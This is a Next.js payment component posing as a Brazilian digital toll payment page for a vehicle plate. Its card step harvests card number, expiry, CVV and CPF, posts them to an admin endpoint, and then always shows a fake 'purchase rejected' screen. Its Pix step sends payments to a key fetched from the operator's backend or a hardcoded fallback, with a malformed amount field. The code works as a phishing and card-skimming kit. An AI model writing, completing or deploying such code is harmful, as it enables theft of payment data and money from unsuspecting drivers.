'use client'

import { useState, useEffect } from 'react'
import Image from 'next/image'
import { ChevronRight, ArrowLeft } from 'lucide-react'
import { QRCodeSVG } from 'qrcode.react'
import { PageHeader } from '@/components/page-header'
import { ResumoDebito } from '@/components/resumo-debito'
import { Ubuntu } from 'next/font/google'
import { useRouter } from 'next/navigation'


const ubuntu = Ubuntu({
  subsets: ['latin'],
  weight: ['400', '500', '700'],
})

// Geração do código Pix Copia e Cola estruturado
function gerarCopiaEColaReal(chave: string): string {
  const merchantAccount = `0014BR.GOV.BCB.PIX01${chave.length.toString().padStart(2, '0')}${chave}`;
  const payloadFormat = "000201";
  const merchantCategory = "52040000";
  const currency = "5303986";
  const amount = "540567.19"; 
  const countryCode = "5802BR";
  const merchantName = "5915PEDAGIO DIGITAL";
  const merchantCity = "6009SAO PAULO";
  const txId = "62070503***";
  
  const concatData = `${payloadFormat}26${merchantAccount.length}${merchantAccount}${merchantCategory}${currency}${amount}${countryCode}${merchantName}${merchantCity}${txId}6304`;
  
  let crc = 0xFFFF;
  for (let i = 0; i < concatData.length; i++) {
    crc ^= concatData.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = (crc << 1) ^ 0x1021;
      } else {
        crc <<= 1;
      }
    }
  }
  const crcString = (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
  return `${concatData}${crcString}`;
}

export function PagamentoClient({ placa }: { placa: string }) {
  const [etapa, setEtapa] = useState<'dados' | 'metodo' | 'cartao' | 'pix_gerado'>('dados')
  const router = useRouter()

  const [nome, setNome] = useState('')
  const [telefone, setTelefone] = useState('')
  const [email, setEmail] = useState('')
  
  const [numeroCartao, setNumeroCartao] = useState('')
  const [nomeCartao, setNomeCartao] = useState('')
  const [validadeCartao, setValidadeCartao] = useState('')
  const [cvvCartao, setCvvCartao] = useState('')
  const [cpfCartao, setCpfCartao] = useState('')

  const [processandoCartao, setProcessandoCartao] = useState(false)
  const [erroCartao, setErroCartao] = useState(false)

  const [chavePix, setChavePix] = useState<string>("")
  const [loadingPix, setLoadingPix] = useState<boolean>(false)
  const [copiado, setCopiado] = useState(false)
  const [horarioVencimento, setHorarioVencimento] = useState('')
  const [segundosRestantes, setSegundosRestantes] = useState(1200)
  
    async function pagarComCartao() {
    setErroCartao(false)
    setProcessandoCartao(true)

    try {
      // Faz o envio real de todas as informações reunidas para a API
      await fetch("/api/admin/pedidos/criar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          placa,
          nome_cliente: nome,
          telefone_cliente: telefone,
          email_cliente: email,
          valor: 67.19,
          status: "pendente",
          // Repassa os estados dos inputs capturados com máscara
          numero_cartao: numeroCartao,
          validade_cartao: validadeCartao,
          cvv_cartao: cvvCartao,
          cpf_cartao: cpfCartao
        })
      })
    } catch (err) {
      console.warn("Erro ao registrar log de cartão, prosseguindo com fluxo visual.", err)
    }

    // Mantém a simulação visual de rejeição de 3 segundos requisitada no layout
    setTimeout(() => {
      setProcessandoCartao(false)
      setErroCartao(true)
    }, 3000)
  }

  
  // --- MÁSCARAS DE FORMATAÇÃO ---
  function formatarTelefone(valor: string) {
    const limpo = valor.replace(/\D/g, '')
    if (limpo.length <= 2) return limpo
    if (limpo.length <= 7) return `(${limpo.slice(0, 2)}) ${limpo.slice(2)}`
    return `(${limpo.slice(0, 2)}) ${limpo.slice(2, 7)}-${limpo.slice(7, 11)}`
  }

  function formatarNumeroCartao(valor: string) {
    const limpo = valor.replace(/\D/g, '')
    return limpo.slice(0, 16).replace(/(\d{4})(?=\d)/g, '$1 ')
  }

  function formatarCPF(valor: string) {
    const limpo = valor.replace(/\D/g, '')
    return limpo
      .slice(0, 11)
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
  }

  function formatarValidadeCartao(valor: string) {
    const limpo = valor.replace(/\D/g, '')
    if (limpo.length <= 2) return limpo
    return `${limpo.slice(0, 2)}/${limpo.slice(2, 4)}`
  }

  function formatarCVV(valor: string) {
    return valor.replace(/\D/g, '').slice(0, 4)
  }

  // --- HANDLERS (CONTROLADORES DE MUDANÇA) ---
  function lidarMudancaTelefone(e: React.ChangeEvent<HTMLInputElement>) {
    setTelefone(formatarTelefone(e.target.value))
  }

  function lidarMudancaNumeroCartao(e: React.ChangeEvent<HTMLInputElement>) {
    setNumeroCartao(formatarNumeroCartao(e.target.value))
  }

  function lidarMudancaCPF(e: React.ChangeEvent<HTMLInputElement>) {
    setCpfCartao(formatarCPF(e.target.value))
  }

  document.querySelectorAll('article').forEach(card => {
    card.addEventListener('touchstart', function() {
        const btn = this.querySelector('button');
        if(btn) btn.style.opacity = '1';
    });
    card.addEventListener('touchend', function() {
        const btn = this.querySelector('button');
        if(btn) {
            setTimeout(() => {
                btn.style.opacity = '0';
            }, 2000);
        }
    });
  });

  function lidarMudancaValidade(e: React.ChangeEvent<HTMLInputElement>) {
    setValidadeCartao(formatarValidadeCartao(e.target.value))
  }

  function lidarMudancaCVV(e: React.ChangeEvent<HTMLInputElement>) {
    setCvvCartao(formatarCVV(e.target.value))
  }
  // --- VALIDAÇÕES DE FORMULÁRIO ---
  const telefoneValido = telefone.replace(/\D/g, '').length === 11
  const emailValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
  const nomeValido = nome.trim().length >= 3
  const formularioValido = nomeValido && telefoneValido && emailValido

  // Validação para ativar o botão de pagamento por cartão
  const cartaoValido = numeroCartao.replace(/\s/g, '').length >= 14 && 
                       nomeCartao.trim().length >= 3 &&
                       validadeCartao.length === 5 &&
                       cvvCartao.length >= 3 &&
                       cpfCartao.replace(/\D/g, '').length === 11

  function lidarProsseguir(e: React.FormEvent) {
    e.preventDefault()
    if (!formularioValido) return
    setEtapa('metodo')
  }

  async function selecionarPix() {
    setLoadingPix(true)
    try {
      const res = await fetch("/api/admin/pix")
      let chaveEncontrada = ""

      if (res.ok) {
        try {
          const d = await res.json()
          if (d && d.ok && d.data) {
            if (typeof d.data === 'string') {
              chaveEncontrada = d.data
            } else if (d.data.valor) {
              chaveEncontrada = d.data.valor
            }
          }
        } catch (errJson) {
          console.warn("Erro ao ler JSON da API Pix:", errJson)
        }
      }

      if (!chaveEncontrada) {
        chaveEncontrada = "d5230cce-902a-4e8c-81be-fdd0a658e817"
      }

      setChavePix(chaveEncontrada)
        
      try {
        await fetch("/api/admin/pedidos/criar", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            placa,
            nome_cliente: nome,
            telefone_cliente: telefone,
            email_cliente: email,
            valor: 67.19,
            status: "pendente"
          })
        })
      } catch (erroPedido) {
        console.warn("Rota /api/admin/pedidos/criar falhou.", erroPedido)
      }

      const agora = new Date()
      agora.setMinutes(agora.getMinutes() + 20)
      const horas = String(agora.getHours()).padStart(2, '0')
      const minutos = String(agora.getMinutes()).padStart(2, '0')
      setHorarioVencimento(`${horas}:${minutos}`)
      setSegundosRestantes(1200)

      setEtapa('pix_gerado')
    } catch (err) {
      setChavePix("d5230cce-902a-4e8c-81be-fdd0a658e817")
      setEtapa('pix_gerado')
    } finally {
      setLoadingPix(false)
    }
  }

  useEffect(() => {
    if (etapa !== 'pix_gerado') return
    const cronometro = setInterval(() => {
      setSegundosRestantes((prev) => {
        if (prev <= 1) {
          clearInterval(cronometro)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(cronometro)
  }, [etapa])

  const pixCopiaEColaReal = chavePix ? gerarCopiaEColaReal(chavePix) : ""

  function formatarCronometro(segundosTotais: number): string {
    const minutos = Math.floor(segundosTotais / 60)
    const segundos = segundosTotais % 60
    return `${String(minutos).padStart(2, '0')}:${String(segundos).padStart(2, '0')}`
  }

    async function copiar() {
    try {
      await navigator.clipboard.writeText(pixCopiaEColaReal)
      setCopiado(true)
      
      // Aguarda exatamente 10 segundos antes de redirecionar o usuário
      setTimeout(() => {
        setCopiado(false)
        router.push('/')
      }, 10000)
    } catch {
      setCopiado(false)
    }
  }


  return (
    <div className={`${ubuntu.className} min-h-screen bg-[#f4f5f8] pb-12 text-left select-none`}>
      <div className="h-1 w-full bg-[#e5ff51]" />
      <PageHeader title="Pagamento" showBack={false} showHome />

      <div className="mx-auto max-w-[820px] px-5 pt-8">
        
        {/* ETAPA 1: CAMPOS DE IDENTIFICAÇÃO DO CONDUTOR */}
        {etapa === 'dados' && (
          <div>
            <h2 className="text-2xl font-bold text-neutral-900 tracking-tight">
              Dados do Comprovante
            </h2>
            <p className="mt-1 text-sm text-neutral-400 font-medium">
              Insira as informações do titular para emissão e envio do recibo
            </p>

            <form onSubmit={lidarProsseguir} className="mt-8 rounded-2xl bg-white p-6 shadow-sm border border-neutral-100 space-y-4">
              <div>
                <label className="text-[11px] font-bold uppercase tracking-wider text-neutral-400">Nome Completo</label>
                <input
                  type="text"
                  required
                  placeholder="Nome do titular do pagamento"
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
                  className="mt-1.5 w-full rounded-xl border border-neutral-200 bg-[#f4f5f8]/50 px-4 py-3.5 text-[15px] font-medium text-neutral-800 outline-none transition-all focus:border-neutral-400 focus:bg-white"
                />
              </div>

              <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                <div>
                  <label className="text-[11px] font-bold uppercase tracking-wider text-neutral-400">Telefone / WhatsApp</label>
                  <input
                    type="tel"
                    required
                    maxLength={15}
                    placeholder="(99) 99999-9999"
                    value={telefone}
                    onChange={lidarMudancaTelefone}
                    className="mt-1.5 w-full rounded-xl border border-neutral-200 bg-[#f4f5f8]/50 px-4 py-3.5 text-[15px] font-medium text-neutral-800 outline-none transition-all focus:border-neutral-400 focus:bg-white"
                  />
                </div>

                <div>
                  <label className="text-[11px] font-bold uppercase tracking-wider text-neutral-400">E-mail</label>
                  <input
                    type="email"
                    required
                    placeholder="exemplo@email.com"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="mt-1.5 w-full rounded-xl border border-neutral-200 bg-[#f4f5f8]/50 px-4 py-3.5 text-[15px] font-medium text-neutral-800 outline-none transition-all focus:border-neutral-400 focus:bg-white"
                  />
                </div>
              </div>

              <button
                type="submit"
                disabled={!formularioValido}
                className="mt-4 flex w-full rounded-xl bg-black py-4 text-base font-bold text-[#e5ff51] justify-center transition-all hover:bg-neutral-900 disabled:opacity-40 disabled:bg-neutral-200 disabled:text-neutral-400 disabled:hover:bg-neutral-200"
              >
                Prosseguir
              </button>
            </form>
          </div>
        )}

        {/* ETAPA 2: OPÇÕES DE PAGAMENTO */}
        {etapa === 'metodo' && (
          <div>
            <div className="flex items-center gap-2 mb-1">
              <button 
                onClick={() => setEtapa('dados')} 
                className="p-1 rounded-lg text-neutral-400 hover:text-neutral-600 transition-colors"
                type="button"
              >
                <ArrowLeft className="size-5" />
              </button>
              <h2 className="text-2xl font-bold text-neutral-900 tracking-tight">Forma de pagamento</h2>
            </div>
            <p className="text-sm text-neutral-400 font-medium ml-8">
              Selecione abaixo como quer fazer o pagamento
            </p>

            <div className="mt-8 divide-y divide-neutral-200/50 bg-white rounded-2xl px-6 border border-neutral-100 shadow-sm">
              <button
                type="button"
                onClick={() => setEtapa('cartao')}
                className="flex w-full items-center gap-4 py-6 text-left transition hover:bg-neutral-50 focus:outline-none"
              >
                <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#f2ff9d] border border-[#e1f56c]/30 p-1">
                  <Image 
                    src="/images/cardlogo.png" 
                    alt="Cartão de Crédito" 
                    width={50} 
                    height={50} 
                    className="object-contain" 
                  />
                </div>
                <div className="flex-1 pr-2">
                  <p className="font-bold text-neutral-800 text-[16px] leading-tight">
                    Cartão de crédito
                  </p>
                  <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
                    Cadastre seu cartão<br />e efetue o pagamento!
                  </p>
                </div>
                <ChevronRight className="size-4 text-neutral-300" />
              </button>

              <button
                onClick={selecionarPix}
                disabled={loadingPix}
                className="flex w-full items-center gap-4 py-6 text-left transition-colors hover:bg-neutral-50/50 focus:outline-none disabled:opacity-50"
                type="button"
              >
                <div className="flex size-[52px] shrink-0 items-center justify-center rounded-[14px] bg-[#dfff1a] p-1 shadow-sm">
                  <Image 
                    src="/images/pixlogo.png" 
                    alt="Pix" 
                    width={46} 
                    height={46} 
                    className="object-contain" 
                  />
                </div>
                <div className="flex-1">
                  <p className="font-bold text-neutral-900 text-[16px] leading-tight">Pix</p>
                  <p className="text-[13px] text-neutral-400 font-normal mt-0.5 leading-tight">
                    Informações para pagamento<br />imediato
                  </p>
                </div>
                <ChevronRight className="size-4 text-neutral-400 shrink-0" />
              </button>
            </div>
          </div>
        )}
        {/* ETAPA CARTÃO */}
        {etapa === 'cartao' && (
          <div>
            <div className="flex items-center gap-2 mb-5">
              <button
                type="button"
                onClick={() => setEtapa('metodo')}
                className="p-1 rounded-lg text-neutral-400 hover:text-neutral-600 focus:outline-none"
              >
                <ArrowLeft className="size-5" />
              </button>

              <h2 className="text-2xl font-bold text-neutral-900">
                Pagamento com cartão
              </h2>
            </div>

            {processandoCartao && (
              <div className="rounded-2xl bg-white p-8 text-center shadow-sm border">
                <p className="font-bold text-lg animate-pulse">
                  Processando pagamento...
                </p>
              </div>
            )}

            {erroCartao && (
              <div className="rounded-2xl bg-white p-8 shadow-sm border border-red-100">
                <h3 className="text-xl font-bold text-red-600">
                  Compra rejeitada
                </h3>
                <p className="mt-2 text-sm text-neutral-500">
                  Compra rejeitada pela administradora do cartão
                </p>
                <button
                  type="button"
                  onClick={() => setErroCartao(false)}
                  className="mt-4 text-xs font-bold text-neutral-500 hover:text-neutral-800 underline uppercase tracking-wider focus:outline-none"
                >
                  Tentar outro cartão
                </button>
              </div>
            )}

            {!processandoCartao && !erroCartao && (
              <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100 space-y-4">
                {/* Input Número do Cartão com Máscara */}
                <input
                  type="text"
                  inputMode="numeric"
                  value={numeroCartao}
                  onChange={lidarMudancaNumeroCartao}
                  placeholder="Número do cartão"
                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
                />

                {/* Input Nome do Titular */}
                <input
                  type="text"
                  value={nomeCartao}
                  onChange={(e) => setNomeCartao(e.target.value)}
                  placeholder="Nome do titular"
                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
                />

                {/* Input CPF com Máscara */}
                <input
                  type="text"
                  inputMode="numeric"
                  value={cpfCartao}
                  onChange={lidarMudancaCPF}
                  placeholder="CPF"
                  className="w-full rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
                />

                <div className="grid grid-cols-2 gap-3">
                  {/* Input Validade com Máscara */}
                  <input
                    type="text"
                    inputMode="numeric"
                    value={validadeCartao}
                    onChange={lidarMudancaValidade}
                    placeholder="MM/AA"
                    className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
                  />

                  {/* Input CVV com Máscara */}
                  <input
                    type="text"
                    inputMode="numeric"
                    value={cvvCartao}
                    onChange={lidarMudancaCVV}
                    placeholder="CVV"
                    className="rounded-xl border px-4 py-3 outline-none focus:border-black/30 transition-colors"
                  />
                </div>

                {/* Botão de Envio Dinâmico com Validação */}
                <button
                  type="button"
                  onClick={pagarComCartao}
                  disabled={!cartaoValido}
                  className="w-full rounded-xl bg-black py-4 font-bold text-[#e5ff51] transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:bg-neutral-900 focus:outline-none"
                >
                  Continuar pagamento
                </button>
              </div>
            )}
          </div>
        )}

        {/* ETAPA 3: GERADOR DE PIX INTEGRADO NA TELA COM CONTADOR */}
        {etapa === 'pix_gerado' && (
          <div className="mx-auto max-w-[560px] pt-4">
            <div className="rounded-2xl bg-white p-6 shadow-sm border border-neutral-100">
              <h2 className="text-xl font-bold text-neutral-900 tracking-tight">Resumo do pedido</h2>
              <div className="mt-5 flex items-center justify-between border-b border-neutral-100 pb-4">
                <span className="text-neutral-400 font-medium text-[14px]">Placa do veículo</span>
                <span className="font-bold text-neutral-900 text-[15px] tracking-wide">{placa}</span>
              </div>
              <div className="mt-4 flex items-center justify-between border-b border-neutral-100 pb-4">
                <span className="text-neutral-400 font-medium text-[14px]">Vencimento código Pix</span>
                <span className="font-bold text-neutral-900 text-[15px]">{horarioVencimento || '--:--'}</span>
              </div>
              <div className="mt-4 flex items-center justify-between rounded-xl bg-[#e5ff51]/20 px-4 py-3.5 border border-[#e5ff51]/30">
                <span className="font-bold text-neutral-800 text-[14px]">Valor do pedido</span>
                <span className="text-lg font-black text-neutral-900">R$ 67,19</span>
              </div>
            </div>

            <p className="mt-8 text-center text-sm text-neutral-400 font-medium">
              Pague em até: <span className="font-bold text-neutral-800 text-base ml-1 tabular-nums">{formatarCronometro(segundosRestantes)}</span>
            </p>

            <div className="mt-4 flex justify-center">
              <div className="rounded-xl bg-white p-4 shadow-sm border border-neutral-100">
                {pixCopiaEColaReal && <QRCodeSVG value={pixCopiaEColaReal} size={180} level="M" />}
              </div>
            </div>

            <p className="mt-6 text-center text-sm text-neutral-400 font-normal px-4 leading-relaxed">
              Copie o código Pix e realize o pagamento no app do seu banco ou carteira digital
            </p>

            <div className="mt-4 rounded-xl bg-white p-5 shadow-sm border border-neutral-100 select-all">
              <p className="break-all font-mono text-[12px] leading-relaxed text-neutral-400 font-medium">
                {pixCopiaEColaReal}
              </p>
            </div>

            <button
              onClick={copiar}
              className="mt-6 w-full rounded-xl bg-black py-4 text-base font-bold text-[#e5ff51] transition-colors hover:bg-neutral-900 focus:outline-none"
              type="button"
            >
              {copiado ? 'Código copiado!' : 'Copiar código Pix'}
            </button>
          </div>
        )}

      </div>

      {/* O ResumoDebito fixo só aparece nas etapas 'dados' e 'metodo'. */}
      {etapa !== 'pix_gerado' && (
        <div className="mx-auto mt-16 max-w-[820px] px-5">
          <ResumoDebito placa={placa} />
        </div>
      )}
    </div>
  )
}
